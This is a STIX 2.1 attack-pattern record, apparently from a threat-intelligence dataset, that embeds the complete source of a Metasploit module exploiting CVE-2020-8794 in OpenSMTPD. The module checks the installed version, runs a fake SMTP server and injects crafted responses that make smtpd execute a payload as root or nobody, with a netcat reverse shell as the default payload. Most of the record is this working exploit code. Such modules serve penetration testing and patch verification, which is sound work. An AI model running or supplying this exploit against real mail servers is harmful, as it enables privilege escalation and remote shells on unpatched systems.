{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--246dc621-637a-4080-9d1f-2a6494a59131",
    "created": "2024-08-14T17:14:31.655773Z",
    "modified": "2024-08-14T17:14:31.655776Z",
    "name": "OpenSMTPD OOB Read Local Privilege Escalation",
    "description": " This module exploits an out-of-bounds read of an attacker-controlled string in OpenSMTPD's MTA implementation to execute a command as the root or nobody user, depending on the kind of grammar OpenSMTPD uses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/opensmtpd_oob_read_lpe.rb",
            "external_id": "opensmtpd_oob_read_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8794"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2020/q1/96"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  # smtpd(8) may crash on a malformed message\n  Rank = AverageRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Expect\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenSMTPD OOB Read Local Privilege Escalation',\n        'Description' => %q{\n          This module exploits an out-of-bounds read of an attacker-controlled\n          string in OpenSMTPD's MTA implementation to execute a command as the\n          root or nobody user, depending on the kind of grammar OpenSMTPD uses.\n        },\n        'Author' => [\n          'Qualys', # Discovery and PoC\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-8794'],\n          ['URL', 'https://seclists.org/oss-sec/2020/q1/96']\n        ],\n        'DisclosureDate' => '2020-02-24',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true, # NOTE: Only when exploiting new grammar\n        # Patched in 6.6.4: https://www.opensmtpd.org/security.html\n        # New grammar introduced in 6.4.0: https://github.com/openbsd/src/commit/e396a728fd79383b972631720cddc8e987806546\n        'Targets' => [\n          [\n            'OpenSMTPD < 6.6.4 (automatic grammar selection)',\n            {\n              patched_version: Rex::Version.new('6.6.4'),\n              new_grammar_version: Rex::Version.new('6.4.0')\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SRVPORT' => 25,\n          'PAYLOAD' => 'cmd/unix/reverse_netcat',\n          'WfsDelay' => 60 # May take a little while for mail to process\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_advanced_options([\n      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])\n    ])\n\n    # HACK: We need to run check in order to determine a grammar to use\n    options.remove_option('AutoCheck')\n  end\n\n  def srvhost_addr\n    Rex::Socket.source_address(session.session_host)\n  end\n\n  def rcpt_to\n    \"#{rand_text_alpha_lower(8..42)}@[#{srvhost_addr}]\"\n  end\n\n  def check\n    smtpd_help = cmd_exec('smtpd -h')\n\n    if smtpd_help.empty?\n      return CheckCode::Unknown('smtpd(8) help could not be displayed.')\n    end\n\n    version = smtpd_help.scan(/^version: OpenSMTPD ([\\d.p]+)$/).flatten.first\n\n    unless version\n      return CheckCode::Unknown('OpenSMTPD version could not be found.')\n    end\n\n    version = Rex::Version.new(version)\n\n    if version < target[:patched_version]\n      if version >= target[:new_grammar_version]\n        vprint_status(\"OpenSMTPD #{version} is using new grammar\")\n        @grammar = :new\n      else\n        vprint_status(\"OpenSMTPD #{version} is using old grammar\")\n        @grammar = :old\n      end\n\n      return CheckCode::Appears(\n        \"OpenSMTPD #{version} appears vulnerable to CVE-2020-8794.\"\n      )\n    end\n\n    CheckCode::Safe(\"OpenSMTPD #{version} is NOT vulnerable to CVE-2020-8794.\")\n  end\n\n  def exploit\n    start_service\n\n    sendmail = \"/usr/sbin/sendmail '#{rcpt_to}' < /dev/null && echo true\"\n\n    print_status(\"Executing local sendmail(8) command: #{sendmail}\")\n    if cmd_exec(sendmail) != 'true'\n      fail_with(Failure::Unknown, 'Could not send mail. Is OpenSMTPD running?')\n    end\n  end\n\n  def on_client_connect(client)\n    print_status(\"Client #{client.peerhost}:#{client.peerport} connected\")\n\n    # Brilliant work, Qualys!\n    case @grammar\n    when :new\n      print_status('Exploiting new OpenSMTPD grammar for a root shell')\n\n      yeet = <<~EOF\n        553-\n        553\n\n        dispatcher: local_mail\n        type: mda\n        mda-user: root\n        mda-exec: #{payload.encoded}; exit 0\\x00\n      EOF\n    when :old\n      print_status('Exploiting old OpenSMTPD grammar for a nobody shell')\n\n      yeet = <<~EOF\n        553-\n        553\n\n        type: mda\n        mda-method: mda\n        mda-usertable: <getpwnam>\n        mda-user: nobody\n        mda-buffer: #{payload.encoded}; exit 0\\x00\n      EOF\n    else\n      fail_with(Failure::BadConfig, 'Could not determine OpenSMTPD grammar')\n    end\n\n    sploit = {\n      '220' => /EHLO /,\n      '250' => /MAIL FROM:<[^>]/,\n      yeet => nil\n    }\n\n    print_status('Faking SMTP server and sending exploit')\n    sploit.each do |line, pattern|\n      send_expect(\n        line,\n        pattern,\n        sock: client,\n        newline: \"\\r\\n\",\n        timeout: datastore['ExpectTimeout']\n      )\n    end\n  rescue Timeout::Error => e\n    fail_with(Failure::TimeoutExpired, e.message)\n  ensure\n    print_status(\"Disconnecting client #{client.peerhost}:#{client.peerport}\")\n    client.close\n  end\n\n  def on_client_close(client)\n    print_status(\"Client #{client.peerhost}:#{client.peerport} disconnected\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-02-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}